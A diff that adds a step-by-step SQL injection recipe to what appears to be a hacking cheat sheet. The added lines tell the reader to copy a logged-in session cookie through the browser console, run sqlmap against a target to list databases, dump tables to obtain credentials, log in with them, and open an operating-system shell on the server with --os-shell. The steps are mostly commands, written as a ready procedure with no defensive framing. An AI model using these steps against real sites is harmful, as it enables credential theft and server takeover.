@@ -136,6 +136,27 @@ jsql
 [url with id] & attack
 sqlmap
 sqlmap -u "website" --cookie="value" --dbs
+
+SQL:
+Visit the website
+Login to website using username & password
+Inspect Element
+On console write- document.cookie and press enter
+copy the cookie value
+open parrot terminal
+sudo su (be root user)
+sqlmap -u "target_url" --cookie="value" --dbs > and press enter
+press Y and enter
+press Y and enter (Enter Y for all)
+You will get Databases in server'
+sqlmap -u "target_url" --cookie="value" -D database_name --tables > press enter and get the table name
+sqlmap -u "target_url" --cookie="value" -D database_name -T table_name --dump > press enter ( get all credential)
+Varify them by login with credential
+
+sqlmap -u "target_url" --cookie="value" --os-shell
+press Y
+optimize machine type hostname
+Tasklist
 ```
 # Android
 ```
